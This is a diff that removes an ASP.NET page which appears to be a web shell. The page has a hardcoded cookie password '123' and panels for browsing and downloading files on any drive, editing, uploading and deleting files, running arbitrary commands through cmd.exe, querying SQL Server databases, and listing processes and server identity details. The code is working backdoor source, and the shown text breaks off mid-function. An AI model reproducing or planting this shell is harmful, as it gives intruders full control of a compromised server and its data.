@@ -1,1638 +1,1689 @@
-<%@ Page Language="C#"   trace="false" EnableViewStateMac="false"  validateRequest="false"  enableEventValidation="false" %>
-<%@ import Namespace="System.Collections.Generic"%> 
-<%@ import Namespace="System.Web.Services"%> 
-<%@ import Namespace="System.Web"%> 
-<%@ import Namespace="System.IO"%> 
-<%@ import Namespace="System"%> 
-<%@ import Namespace="System.Net" %>
-<%@ import Namespace="System.Diagnostics"%> 
-<%@ Import Namespace="System.Data.SqlClient"%>
-<%@ import Namespace="Microsoft.Win32"%>
-<%@ import Namespace="System.Management"%>
-<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
-<!DOCTYPE html>
-<style type="text/css">
-body {
-	background: #f0f0f0;
-	margin: 0;
-	padding: 0; 
-	font: 12px normal Verdana, Arial, Helvetica, sans-serif;
-	color: #444;
-    width:1000px;
-}
-h1 {font-size: 3em; margin: 20px 0;}
-.container {width: 90%; margin: 10px auto;}
-ul.tabs {
-	margin: 0;
-	padding: 0;
-	float: left;
-	list-style: none;
-	height: 32px;
-	border-bottom: 1px solid #999;
-	border-left: 1px solid #999;
-	width: 100%;
-}
-ul.tabs li {
-	float: left;
-	margin: 0;
-	padding: 0;
-	height: 31px;
-	line-height: 31px;
-	border: 1px solid #999;
-	border-left: none;
-	margin-bottom: -1px;
-	background: #e0e0e0;
-	overflow: hidden;
-	position: relative;
-}
-ul.tabs li a {
-	text-decoration: none;
-	color: #000;
-	display: block;
-	font-size: 1.2em;
-	padding: 0 20px;
-	border: 1px solid #fff;
-	outline: none;
-}
-ul.tabs li a:hover {
-	background: #ccc;
-}	
-html ul.tabs li.active, html ul.tabs li.active a:hover  {
-	background: #fff;
-	border-bottom: 1px solid #fff;
-}
-.tab_container {
-	border: 1px solid #999;
-	border-top: none;
-	clear: both;
-	float: left; 
-	width: 100%;
-	background: #fff;
-	-moz-border-radius-bottomright: 5px;
-	-khtml-border-radius-bottomright: 5px;
-	-webkit-border-bottom-right-radius: 5px;
-	-moz-border-radius-bottomleft: 5px;
-	-khtml-border-radius-bottomleft: 5px;
-	-webkit-border-bottom-left-radius: 5px;
-}
-.tab_content {
-	padding: 20px;
-	font-size: 1.2em;
-}
-.tab_content h2 {
-	font-weight: normal;
-	padding-bottom: 10px;
-	border-bottom: 1px dashed #ddd;
-	font-size: 1.8em;
-}
-.tab_content h3 a{
-	color: #254588;
-}
-.tab_content img {
-	float: left;
-	margin: 0 20px 20px 0;
-	border: 1px solid #ddd;
-	padding: 5px;
-}
-</style>
-<style type="text/css">
-    iframe.hidden
-{
-display:none
-}
-        td
-        {
-            padding: 2px;
-            background: #e8edff;
-            border-top: 1px solid #fff;
-            color: #669;
-            
-        }
-         tr:hover td{ 
-                background-color:#7DFDFE;
-                
-                
-               
-                }
-     th
-    {
-        padding: 2px;
-        color: #039;
-        background: #b9c9fe;
-    }
-                
-                    
-    table
-    {
-        height: 100%;
-        width: 100%;
-    }
-    #content
-    {
-        z-index: 1;
-        left: 20px;
-        top: 39px;
-        position: absolute;
-        height: 155px;
-        width: 1214px;
-    }
-    #upload
-    {
-        width: 527px;
-        height: 52px;
-        background-color: #CCCCCC;
-    }
-    #TextArea1
-    {
-        height: 278px;
-        width: 380px;
-    }
-    .buttons
-    {
-        height:30px;
-        cursor:pointer;
-    }
-    </style>
-
- 
-
-<script runat="server">
-/// <problems>
-/// - javascript registered code
-/// - driver dropdownlist problem 
-/// </problem>
-/// 
-
-    /// <TO DO>
-    /// - create new file ,dir.
-    /// - copy /cut file ,dir
-    /// </TO DO>
-    /// 
-
-     public static string curr = "xxx";
-     string connstr;
-     string password="123";
-     public class data
-     {
-         public data(string n, string s, string fp, string lm)
-         {
-             Name = n; Size = s; FullPath = fp;lastmodfiy=lm;
-         }
-         public string Name;
-         public string FullPath;
-         public string Size;
-         public string lastmodfiy;
-     }
-     public static void RegisterJavaScript(System.Web.UI.Page page)
-     {
-         
-               page.ClientScript.RegisterHiddenField("__EVENTTARGET","");
-                page.ClientScript.RegisterHiddenField("__ARGS","");
-                string s=@"<script language=Javascript>";
-                s+=@"function Bin_PostBack(eventTarget,eventArgument)";
-                s+=@"{";
-                s+=@"var theform=document.forms[0];";
-                s+=@"theform.__EVENTTARGET.value=eventTarget;";
-                s+=@"theform.__ARGS.value=eventArgument;";
-                s+=@"theform.submit();";
-                s+=@"} ";
-                s+=@"</scr"+"ipt>";
-                page.RegisterStartupScript("asd",s);
-         
-                }
-     
-     
-                
-    protected void Page_Load(object sender, EventArgs e)
-    {
-        Page.Title = " ";
-        RegisterJavaScript(this);
-        hide_allpanel();
-        if (DriversList.Items.Count == 0)
-        {
-            DriveInfo[] drives = DriveInfo.GetDrives();
-            DriversList.Items.Clear();
-            DriversList.Items.Add("Select Drive");
-            foreach (DriveInfo dinfo in drives)
-            {
-
-                DriversList.Items.Add(new ListItem(dinfo.Name + "  " + dinfo.DriveType, dinfo.Name));  //);
-            }
-        }
-        //////////////////////////
-       
-        ////////////////////////////////
-        if (check_auth())
-        {
-          
-            this.Menue.Visible = true;
-            Logout.Visible = true;
-          
-            
-        }
-        else
-        {
-           return;
-           
-        }
-        msgs.Text = "";        
-        
-       if (Request.QueryString["Name"] != null || Request.QueryString["Name"] != "")
-       {
-           string temp = Request.QueryString["Name"];
-           if(temp != null)
-           download(base64Decode(temp));
-      
-       }
-       
-         
-        if (!IsPostBack)
-        {
-            
-            
-         
-             GetFiles_Dirs(".", true);
-        //   string[] drivers = Directory.GetLogicalDrives();
-            
-           
-    
-        /////////////////
-           
-            
-       }
-        if (IsPostBack)
-        {
-           
-            string evarg = Request["__EVENTTARGET"];
-            string args = Request["__ARGS"];
-            
-          //  Page.Title = evarg;
-            if (evarg != "")
-            {
-                switch (evarg)
-                {
-                    
-                    case "down":
-                        download(base64Decode(args));
-                        break;
-                    case "GetFiles_Dirs":
-                        GetFiles_Dirs(base64Decode(args), false);
-                        break;
-                    case "shell_root":
-                        GetFiles_Dirs(base64Decode(args), true);
-                        break;
-                    case "del":
-                        delete_file(base64Decode(args));
-                       break;
-                    case "del2":
-                       delete_folder(base64Decode(args));
-                       break;
-                    case "delall":
-                       deleteall(args);
-                       break;
-                    case "ren":
-                       rename_file(args);
-                        break;
-                    case "ren2":
-                        rename_folder(args);
-                        break;
-                    case "edit":
-                        editing(base64Decode(args));
-                        break;
-
-                    case "newdir":
-                        create_new_dir((args));
-                        break;
-                    case "newfile":
-                        create_new_file((args));
-                        break;
-                   
-                }
-
-               
-            }
-        }
-        
-        //if(IsPostBack)
-      
-            
-    }
-    public bool check_auth()
-    {
-        if (Request.Cookies["Login_Cookie"] == null)
-        {
-            return false;
-        }
-        else
-        {
-            if (Request.Cookies["Login_Cookie"].Value != password)
-            {
-                return false;
-            }
-            else
-            {
-                
-                return true;
-            }
-        }
-    }
-    public void hide_allpanel()
-    {
-        this.Login.Visible = true;
-        object[] divs = { this.FileManger, this.CMD, this.DBS ,this.editpanel,this.UserInfo,this.Processes_Services,this.CopyFiles};
-        foreach (object s in divs)
-        {
-            Panel p2 = new Panel();
-            p2 = (Panel)s;
-            p2.Visible = false;
-        }
-    }
-
-    void process()
-    {
-        Table tbl = new Table();
-
-        //   tbl.Style = @"width:100%";
-        tbl.Width = 870;
-        this.Processes_Services.Controls.Add(tbl);
-        int tblRows = 10;
-        int tblCols = 3;
-        TableHeaderRow header_tr = new TableHeaderRow();
-        TableHeaderCell proc_id = new TableHeaderCell();
-        TableHeaderCell proc_user = new TableHeaderCell();
-        TableHeaderCell proc_name = new TableHeaderCell();
-        proc_id.Text = "ID";
-       proc_name.Text = "Process Name";
-       proc_user.Text = "User";
-        header_tr.Cells.Add(proc_id);
-        header_tr.Cells.Add(proc_name);
-         header_tr.Cells.Add(proc_user);
-        tbl.Rows.Add(header_tr);
-        Process[] p = Process.GetProcesses();
-        foreach (Process sp in p)
-        {
-            TableRow data_tr = new TableRow();
-            TableCell proc_id_tc = new TableCell();
-             proc_id_tc.Text = sp.Id.ToString();
-            TableCell proc_name_tc = new TableCell();
-            proc_name_tc.Text =  sp.ProcessName;
-            TableCell proc_user_tc = new TableCell();
-         //   proc_user_tc.Text =  GetProcessOwner(sp.Id.ToString());// GetUserName(sp.Id);//
-            data_tr.Cells.Add(proc_id_tc);
-            data_tr.Cells.Add(proc_name_tc);
-            data_tr.Cells.Add(proc_user_tc);
-            tbl.Rows.Add(data_tr);
-
-        }
-        message(true, "list process");
-    }
-
-    string get_user_process(int i)
-    {
-        using (ManagementObject proc = new   
-            
-            ManagementObject("Win32_Process.Handle='" + i.ToString() + "'"))
-        {
-
-         //   proc.Get();
-            string[] s = new String[2];
-            //Invoke the method and populate the array with the user name and domain
-
-            proc.InvokeMethod("GetOwner", (object[])s);
-
-            return s[1] + "\\" + s[0];
-        }
-
-
-    }
-    private string GetUserName(int procName)
-    {
-        string[] ownerInfo = new string[2];
-        foreach (ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='" + procName + "'"))
-        {
-            p.InvokeMethod("GetOwner", (object[])ownerInfo);
-        }
-        return ownerInfo[0];
-        
-        
-    }
-
-    public string GetProcessOwner(string processName)
-    {
-        string query = "Select * from Win32_Process Where ProcessID = \"" + processName + "\"";
-        ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
-        ManagementObjectCollection processList = searcher.Get();
-
-        foreach (ManagementObject obj in processList)
-        {
-            string[] argList = new string[] { string.Empty, string.Empty };
-            int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
-            if (returnVal == 0)
-            {
-                // return DOMAIN\user
-                string owner = argList[1] + "\\" + argList[0];
-                return owner;
-            }
-        }
-
-        return "NO OWNER";
-    }
-    
-    
-        public ManagementObjectCollection PhQTd(string query)
-{
-ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
-return QS.Get();
-}
-    void u_info()
-    {
-        Table tbl = new Table();
-        
-     //   tbl.Style = @"width:100%";
-        tbl.Width = 870;
-        this.UserInfo.Controls.Add(tbl);
-        Add_Table_Row(tbl, "Server IP", Request.ServerVariables["LOCAL_ADDR"]);
-        Add_Table_Row(tbl, "Host Name", Dns.GetHostName() );//Environment.MachineName);
-        Add_Table_Row(tbl, "IIS Version", Request.ServerVariables["SERVER_SOFTWARE"]);
-        Add_Table_Row(tbl, "IIS APPPOOL Identity", Environment.UserName);
-        Add_Table_Row(tbl, "OS Version", Environment.OSVersion.ToString());
-        Add_Table_Row(tbl, "System Time", DateTime.Now.ToString());
-      
-        
-        
-        message(true, "");
-    }
-
-    void Add_Table_Row(Table tbl, string s1, string s2)
-    {
-        TableRow data_tr = new TableRow();
-        TableCell cell1 = new TableCell();
-        cell1.Text = s1;
-        TableCell cell2 = new TableCell();
-        cell2.Text = s2;
-        data_tr.Cells.Add(cell1);
-        data_tr.Cells.Add(cell2);
-        tbl.Rows.Add(data_tr);
-    }
-    // ////////////////////////////////////////////
-    public void process_design(object sender, EventArgs e)
-    {
-        Button b = sender as Button;
-      //  b.BackColor = System.Drawing.Color.Red;
-        //LinkButton b = sender as LinkButton;
-        show_panel(b.Text);
-        if (b.Text == "Processes_Services")
-            process();
-        if (b.Text == "UserInfo")
-            u_info();
-        
-    }
-    // /////////////////////////////////////
-    public void fm(object sender, EventArgs e)
-    {
-        this.FileManger.Visible = true;
-        GetFiles_Dirs(".", true);
-    }
-
-    public void show_panel(string ctrl)
-    {
-        this.Login.Visible = false;
-        object[] divs = { this.FileManger, this.CMD, this.DBS,this.editpanel ,this.UserInfo, this.Processes_Services,this.CopyFiles};
-        foreach (object s in divs)
-        {
-            Panel p2 = new Panel();
-            p2 = (Panel)s;
-            if (p2.ID==ctrl)
-                p2.Visible = true; 
-          //  if(p2.ID=="FileManger")
-             //   GetFiles_Dirs(".", true);
-        }
-    }
-    
-  
-   
-
-
-    public string base64Encode(string data)
-    {
-        try
-        {
-            byte[] encData_byte = new byte[data.Length];
-            encData_byte = System.Text.Encoding.UTF8.GetBytes(data);
-            string encodedData = Convert.ToBase64String(encData_byte);
-            return encodedData;
-        }
-        catch (Exception e)
-        {
-            throw new Exception("Error in base64Encode" + e.Message);
-        }
-    }
-
-    public string base64Decode(string data)
-    {
-        try
-        {
-            System.Text.UTF8Encoding encoder = new System.Text.UTF8Encoding();
-            System.Text.Decoder utf8Decode = encoder.GetDecoder();
-
-            byte[] todecode_byte = Convert.FromBase64String(data);
-            int charCount = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length);
-            char[] decoded_char = new char[charCount];
-            utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0);
-            string result = new String(decoded_char);
-            return result;
-        }
-        catch (Exception e)
-        {
-            throw new Exception("Error in base64Decode" + e.Message);
-        }
-    }
-    
-    public void message(bool status, string msg)
-    {
-        if (status == true)
-        {
-            msgs.ForeColor = System.Drawing.Color.Green;
-            msgs.Text = "Sucess, " + msg;
-        }
-        else
-        {
-            msgs.ForeColor = System.Drawing.Color.Red;
-            msgs.Text = "Error, " + msg;
-        }
-    }
-
-    string count_files_dirs(string p)
-    {
-        int fc = 0; int dc = 0;
-        string[] files = Directory.GetFiles(p);
-        string[] dirs = Directory.GetDirectories(p);
-        foreach (string f in files)
-        {
-            fc += 1;
-        }
-        foreach (string f in dirs)
-        {
-            dc += 1;
-        }
-        return dc+" dirs, "+fc+" files";
-    }
-    public  void GetFiles_Dirs(string path ,bool isvirtual)
-    {
-        try
-        {
-
-            show_panel(this.FileManger.ID);
-            editpanel.Visible = false;
-            curr = path;
-
-            ArrayList arraydata = new ArrayList();
-
-            string currentpath = "";
-            if (isvirtual)
-            {
-                currentpath = HttpContext.Current.Server.MapPath(path);
-            }
-            else
-                currentpath = path;
-            currentpathlabel.Text = currentpath;
-            Hidden1.Value = currentpath;
-
-
-            string[] files = Directory.GetFiles(currentpath);
-            string[] dirs = Directory.GetDirectories(currentpath);
-            string previospath = "";
-            string[] ppath = currentpath.Split('\\');
-            for (int n = 1; n <= ppath.Length - 1; n++)
-            {
-
-                if (ppath.Length - 1 == 1)
-                {
-                    previospath += ppath[n - 1] + "\\";
-
-
-                }
-                else if (n == ppath.Length - 1)
-                {
-                    previospath += ppath[n - 1];
-
-
-                }
-                else
-                {
-                    previospath += ppath[n - 1] + "\\";
-
-                }
-
-
-            }
-            string prevtemp = "";
-            //  Literal1.Text = previospath;
-            for (int n = 0; n < ppath.Length; n++)
-            {
-
-                if (n == 0)
-                {
-
-                    //<%=  base64Encode(ppath[n] + "\\")%>
-                    string dec = base64Encode(ppath[n] + "\\");
-                    Literal1.Text = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec + "')\">" + ppath[n] + "\\" + "</a>";
-                    prevtemp = ppath[n];
-
-                }
-                else
-                {
-                    string dec1 = base64Encode(prevtemp + "\\" + ppath[n]);
-
-                    Literal1.Text += "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + dec1 + "')\">" + ppath[n] + "\\" + "</a>";
-                    prevtemp = prevtemp + "\\" + ppath[n];
-
-                }
-
-
-
-            }
-           arraydata.Add(new data("..  " , "Parent Folder", previospath, currentpath));
-          
-             
-            //  object o = new object { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath };
-            //fileslist.Add(new { Name = "..", Size = "..", FullPath = previospath.Replace(@"\", @"\\"), DataSource = currentpath });
-             int dirs_count = 0;
-            int files_count = 0;
-
-            foreach (string d in dirs)
-            {
-                DirectoryInfo dinfo = new DirectoryInfo(d);
-                HyperLink g = new HyperLink();
-                g.Text = dinfo.Name;
-                //  fileslist.Add(new { Name = dinfo.Name, Size = "Folder", FullPath = dinfo.FullName.Replace(@"\", @"\\"), DataSource = currentpath });
-                arraydata.Add(new data(dinfo.Name, "Folder", dinfo.FullName, dinfo.LastWriteTime.ToString("d/MM/yyyy - hh:mm:ss tt")));
-                dirs_count+=1;
-
-            }
-            foreach (string f in files)
-            {
-                FileInfo finfo = new FileInfo(f);
-
-
-                arraydata.Add(new data(finfo.Name, finfo.Length.ToString(), finfo.FullName.Replace(@"\", @"\\"), finfo.LastWriteTime.ToString("d/MM/yyyy  - hh:mm:ss tt")));
-                files_count += 1;
-            }
-            
-           
-            
-            foreach (object o in arraydata)
-            {
-                data d = (data)o;
-
-                HtmlTableRow r = new HtmlTableRow();
-                HtmlTableCell cname = new HtmlTableCell();
-                HtmlTableCell csize = new HtmlTableCell();
-                HtmlTableCell lastmodify = new HtmlTableCell();
-                HtmlTableCell ctodo = new HtmlTableCell();
-                if (d.Size == "Parent Folder")
-
-                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>" + "&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp " + files_count + "&nbspFiles ," + dirs_count + "&nbspFolders";
-
-                else if (d.Size == "Folder")
-                {
-                    cname.InnerHtml = "<a href=\"javascript:Bin_PostBack('GetFiles_Dirs','" + base64Encode(d.FullPath) + "')\">" + d.Name + "</a>";
-                    csize.InnerHtml = "--";
-                    lastmodify.InnerHtml = d.lastmodfiy;
-                    ctodo.InnerHtml ="<a href=\"#\" onclick=\"javascript:rename2('" + d.Name + "')\">Rename</a>" + " || " +
-                   "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete folder " + d.Name+ " it may be non-empty ,all files & dirs will be deleted ?')){Bin_PostBack('del2','" + base64Encode(d.FullPath) + "')}\">Del</a>";
-                }
-                else
-                {
-                    //"<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(objfile.DirectoryName)+"')\">"+objfile.FullName+"</a>";
-                    cname.InnerHtml = "<input id=\"Checkbox1\" name=\"" + base64Encode(d.FullPath) + "\" type=\"checkbox\" />" + d.Name;
-                    csize.InnerHtml = convert_bytes(Convert.ToInt64(d.Size));
-                    lastmodify.InnerHtml = d.lastmodfiy;
-                    ctodo.InnerHtml = "<a href= \"#\" onclick=\"javascript:Bin_PostBack('down','" + base64Encode(d.FullPath) + "')\">Down</a>" + " || " +
-                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('edit','" + base64Encode(d.FullPath) + "')\">Edit</a>" + " || " +
-                        "<a href=\"#\" onclick=\"javascript:rename('" + d.Name + "')\">Rename</a>" + "|" +
-                        "<a href=\"#\" onclick=\"javascript:Bin_PostBack('copymove','" + base64Encode(d.FullPath) + "')\">Copy/Move</a>" + " || " +
-                    "<a href=\"#\" onclick=\"javascript:if(confirm('Are you sure delete the file  "+ d.Name+"  ?')){Bin_PostBack('del','" + base64Encode(d.FullPath) + "')}\">Del</a>";
-                }
-                r.Cells.Add(cname);
-                r.Cells.Add(csize);
-                r.Cells.Add(lastmodify);
-                r.Cells.Add(ctodo);
-                tblEmployee.Rows.Add(r);
-
-
-            }
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-    }
-
-    string convert_bytes(Int64 bytes)
-    {
-        
-        if ((bytes / 1024) < 1)
-            return bytes + " B";
-         
-        else if ((bytes / (1024 * 1024)) < 1)
-           return string.Format("{0:####0.0} KB",(double) bytes / 1024 );
-            
-        else if ((bytes / (1024 * 1024 * 1024)) < 1)
-           return string.Format("{0:####0.0} MB", (double)bytes / (1024 * 1024));
-                       
-        else
-            return string.Format("{0:####0.0} GB", (double) bytes / (1024 * 1024 * 1024));
-
-    
-    
-    }
-    // //////////////////////////////
-
-    void create_new_dir(string dir)
-    {
-        try
-        {
-            string path = currentpathlabel.Text + "\\";
-            Directory.CreateDirectory(path + dir);
-            message(true, "Folder:" + " '" + dir + "' " + "Created");
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        } 
-        
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-
-    void create_new_file(string file)
-    {
-        try
-        {
-            string path = currentpathlabel.Text + "\\";
-            if (File.Exists(path + file))
-            {
-                message(false, "File" + " '" + file + "' " + "exist,you can edit it");
-                GetFiles_Dirs(currentpathlabel.Text, false);
-            }
-            else
-            {
-
-                StreamWriter sr = new StreamWriter(path + file, false);
-                sr.Close();
-                message(true, "New File" + " '" + file + "' " + "Created");
-                editing(path + file);
-            }
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-
-       // GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-    // //////// Edit File//////////////////
-    public void editing(string file)
-    {
-        try
-        {
-            show_panel("editpanel");
-
-
-            filetoedit.Text = file;
-            if (File.Exists(file))
-            {
-                StreamReader sr;
-
-                sr = new StreamReader(file);
-
-                editfile.Text = sr.ReadToEnd();
-                sr.Close();
-            }
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-
-    }
-    protected void Save_Click(object sender, EventArgs e)
-    {
-        try
-        {
-
-            StreamWriter sw;
-            string file = filetoedit.Text;
-            sw = new StreamWriter(file, false);
-
-            sw.Write(editfile.Text);
-            sw.Close();
-            message(true, "File:" + " '" + file + "' " + "Saved");
-
-
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-    // /////////////////////////////////
-    
-    // ///////////upload///////////////////
-    protected void Upload_Click(object sender, EventArgs e)
-    {
-        try
-            {
-
-        if (FileUpload1.HasFile)
-             {
-            
-                string filename = Path.GetFileName(FileUpload1.FileName);
-                FileUpload1.SaveAs(currentpathlabel.Text + "\\" + filename);
-                message(true, "File: '" + currentpathlabel.Text + "\\" + filename + "'Uploaded");
-              
-             }
-        }
-            catch (Exception ex)
-            {
-                message(false, ex.Message);
-            }
-          GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-    // ////////////////////////////////////////////
-    
-    // /////////////download file(s)/////////////////
-    public void download(string path)
-    {
-        try
-        {
-            FileInfo fs = new FileInfo(path);
-            Response.Clear();
-            Page.Response.ClearHeaders();
-            Page.Response.Buffer = false;
-            this.EnableViewState = false;
-           // Response.AddHeader("Content-Disposition", "attachment;filename=" + HttpUtility.UrlEncode(fs.Name, System.Text.Encoding.UTF8));
-            Response.AddHeader("Content-Disposition", "attachment;filename=" + fs.Name);
-            Response.AddHeader("Content-Length", fs.Length.ToString());
-            Page.Response.ContentType = "application/unknown";
-            Response.WriteFile(fs.FullName);
-            Page.Response.Flush();
-            Page.Response.Close();
-            Response.End();
-            Page.Response.Clear();           
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-            
-    }
-
-    // ////////////////////////////////////////////
-
-    // /////////////rename file(s)/////////////////
-    public void rename_file(string paths)
-    {
-        try
-        {
-            string[] files = paths.Split(',');
-
-            File.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
-            message(true, "File Renamed");
-         
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }  
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-     /////////////////////////////////////////////
-
-    public void rename_folder(string paths)
-    {
-        try
-        {
-            string[] files = paths.Split(',');
-            
-           Directory.Move(currentpathlabel.Text + "\\" + files[0], currentpathlabel.Text + "\\" + files[1]);
-            message(true, "Folder Renamed");
-
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-    // ////////////////////////////
-     
-    // /////////////delete files/////////////////
-    public void deleteall(string paths)
-    {
-        try
-        {
-            string[] files = paths.Split(',');
-            for (int i = 0; i < files.Length - 1; i++)
-            {
-
-                File.Delete(base64Decode(files[i]));
-            }
-            message(true, "Files Delted");
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-      
-
-
-        
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-
-    // ////////////////////////////////////////////
-
-    // /////////////delete file/////////////////
-    public void delete_file(string path)
-    {
-        try
-        {
-            FileInfo fs = new FileInfo(path);
-
-
-            fs.Delete();
-            message(true, "File Deleted");
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-        //////////////////////////////////////
-        
-        public void delete_folder(string path)
-    {
-        try
-        {
-            DirectoryInfo  fs = new DirectoryInfo(path);
-
-
-            fs.Delete(true);
-            message(true, "Folder Deleted");
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-        
-        GetFiles_Dirs(currentpathlabel.Text, false);
-    }
-
-
-
-    // ////////////////////////////////////////////
-
-    // /////////////dos commands/////////////////
-    protected void CmdSubmit_Click(object sender, EventArgs e)
-    {
-        show_panel(this.CMD.ID);
-        CmdResult.Text = command(Command.Text);
-    }
-   
-    public static string command(string cmd)
-    {
-      //  string argument = string.Format(@" -S {0} -U {1} -P {2} ", "LOSMAN-PC", "test", "asd");
-        string argument = string.Format(@" -S {0} ", "LOSMAN-PC");
-      //  System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("sqlcmd.exe",argument);
-      System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
-        psi.CreateNoWindow = true;
-        psi.UseShellExecute = false;
-        psi.RedirectStandardOutput = true;
-        psi.RedirectStandardInput = true;
-        psi.RedirectStandardError = true;
-        psi.WorkingDirectory = HttpContext.Current.Server.MapPath(".");
-        // Start the process
-        System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);
-
-        // Attach the output for reading
-        System.IO.StreamReader sOut = proc.StandardOutput;
-        System.IO.StreamReader sOut2 = proc.StandardError;
-        //  sOut = proc.StandardError;
-        // Attach the in for writing
-        System.IO.StreamWriter sIn = proc.StandardInput;
-        string commands = cmd;
-        string[] delimiter = { Environment.NewLine };
-
-        string[] b = commands.Split(delimiter, StringSplitOptions.None);
-        foreach (string s in b)
-        {
-            sIn.WriteLine(s);
-        }
-        // string stEchoFmt = "# {0} run successfully. Exiting";
-
-
-        //  sIn.WriteLine(String.Format(stEchoFmt, ""));
-        // Write each line of the batch file to standard input
-        sIn.WriteLine("Exit");
-        // Close the process
-        proc.Close();
-        // Read the sOut to a string.
-        string results = sOut.ReadToEnd().Trim();
-      string resultserror =sOut2.ReadToEnd().Trim();
-        // Close the io Streams;
-        sIn.Close();
-        sOut.Close();
-
-        return results + resultserror;
-
-    }
-
-    // ////////////////////////////////////////////
-
-    // /////////////get drive files & dirs/////////////////
-    protected void slctdrive_Click(object sender, EventArgs e)
-    {
-        try
-        {
-
-           if (DriversList.SelectedValue == "Select Drive")
-               GetFiles_Dirs(currentpathlabel.Text, false);
-           
-               GetFiles_Dirs(DriversList.SelectedValue, false);
-        //}
-        }
-        catch (Exception ex)
-        {
-            message(false, ex.Message);
-        }
-
-    }
-    private void getdatabases(int ind)
-    {
-
-        try
-        {
-            DropDownList1.Items.Clear();
-
-            SqlConnection myconn;
-            SqlCommand mycomm;
-
-            myconn = new SqlConnection(connections.Text);
-            myconn.Open();
-            string command = "SELECT name FROM sys.sysdatabases where name NOT IN ('master', 'tempdb', 'model', 'msdb') order by name; ";
-
-            mycomm = new SqlCommand(command, myconn);
-            SqlDataReader dr = mycomm.ExecuteReader();
-            while (dr.Read())
-            {
-                DropDownList1.Items.Add(dr[0].ToString());
-            }
-            myconn.Close();
-
-            DropDownList1.SelectedIndex = ind;
-
-        }
-        catch (Exception ex)
-        {
-            msgs.Text = ex.Message;
-        }
-    }
-    // ///////////////////////////
-    private void gettables(int ind)
-    {
-        try
-        {
-            DropDownList2.Items.Clear();
-
-            SqlConnection myconn;
-            SqlCommand mycomm;
-
-            myconn = new SqlConnection(connections.Text);
-            myconn.Open();
-            string command = "SELECT * FROM sys.tables order by name; ";
-
-            mycomm = new SqlCommand(command, myconn);
-            SqlDataReader dr = mycomm.ExecuteReader();
-            while (dr.Read())
-            {
-
-                DropDownList2.Items.Add(dr[0].ToString());
-            }
-
-            DropDownList2.SelectedIndex = ind;
-            myconn.Close();
-        }
-        catch (Exception ex)
-        {
-            msgs.Text = ex.Message;
-        }
-    }
-
-
-    // //////////////////////////////////////////////////////////////////
-    public ArrayList getcolums()
-    {
-          SqlConnection myconn;
-            SqlCommand mycomm;
-            ArrayList arrcolumns = new ArrayList();
-            myconn = new SqlConnection(connections.Text);
-            myconn.Open();
-            string command = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Bugs'; ";
-
-            mycomm = new SqlCommand(command, myconn);
-            SqlDataReader dr = mycomm.ExecuteReader();
-            Table tbl = new Table();
-           this.DBS.Controls.Add(tbl);
-           while (dr.Read())
-           {
-               arrcolumns.Add(dr[0].ToString());
-           }
-           return arrcolumns;
-    }
-     private void CreateDynamicTable(string query)
-    {
-        try
-        {
-            // ArrayList arrcolumns = getcolums();
-            SqlConnection myconn;
-            SqlCommand mycomm;
-
-            myconn = new SqlConnection(connections.Text);
-            myconn.Open();
-            string command = query;
-
-            mycomm = new SqlCommand(command, myconn);
-            SqlDataReader dr = mycomm.ExecuteReader();
-            Table tbl = new Table();
-            tbl.Width = 100;
-            this.DBS.Controls.Add(tbl);
-            int tblRows = 10;
-            int tblCols = dr.FieldCount; ;
-            TableRow tr2 = new TableRow();
-
-            for (int j = 0; j < dr.FieldCount; j++)
-            {
-                TableHeaderCell tc = new TableHeaderCell();
-                TextBox txtBox = new TextBox();
-
-
-                // Add the control to the TableCell
-                tc.Text = dr.GetName(j).ToString();
-                // Add the TableCell to the TableRow
-                tr2.Cells.Add(tc);
-            }
-            tbl.Rows.Add(tr2);
-            int c = 0;
-            while (dr.Read())
-            {
-                
-
-                TableRow tr = new TableRow();
-                for (int j = 0; j < tblCols; j++)
-                {
-                    TableCell tc = new TableCell();
-                    TextBox txtBox = new TextBox();
-
